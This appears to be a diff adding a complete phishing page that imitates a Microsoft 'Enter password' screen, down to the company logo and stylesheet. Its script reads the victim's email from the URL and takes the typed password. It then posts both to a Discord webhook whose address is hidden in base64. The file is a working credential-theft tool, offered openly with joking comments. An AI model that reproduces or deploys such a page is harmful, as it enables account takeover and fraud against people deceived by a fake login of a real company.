@@ -1,0 +1,47 @@
+<!DOCTYPE html>
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<html>
+  <head>
+    <title>Totally not a fake login page for a big multimedia company that I'm literally using their services right now.</title>
+    <link rel="stylesheet" href="microsoft.css">
+  </head>
+  <body>
+    <div class="container">
+      <img src="microsoftlogo.svg"></img>
+      <br><br>
+      <span id="email"></span>
+      <br><br>
+      <h2 class="label">Enter password</h2>
+      <br><br>
+        <input type="text" placeholder="Password" id="password">
+        <br><br>
+        <small><a href="">Forgot password?</a></small>
+        <br><br>
+        <small><a href="">Other ways to sign in</a></small>
+        <br><br><br>
+      <br>
+      <button class="nextbutton" onclick="finish()">Next</button>
+    </div>
+
+    <script>
+      const urlParams = new URLSearchParams(window.location.search);
+      const email = urlParams.get('email');
+      document.getElementById('email').textContent = email;
+
+      
+      function finish() {
+        const webhook = atob("aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTI2NDQzNjkyNzAxMzE5MTc3NC9PLWg0Q3BoYlZEVTY0UjQtalJZR2tXbmdPWDNOZG1pM1lTMUtELXQ5YU1hRVd1WldHWmMwVFBmeFFyOWk4STJwY1lCWQ=="); //Don't use this to spam, please.
+        const contents = `NEW FISHY BUSINESS GOIN' ON!\n\nEmail: ${email}\nPassword: ${document.getElementById("password").value}`;
+        const request = new XMLHttpRequest();
+        request.open("POST", webhook);
+        request.setRequestHeader('Content-type', 'application/json');
+        const params = {
+          content: contents
+        }
+        request.send(JSON.stringify(params));
+      }
+
+    </script>
+    
+  </body>
+</html>
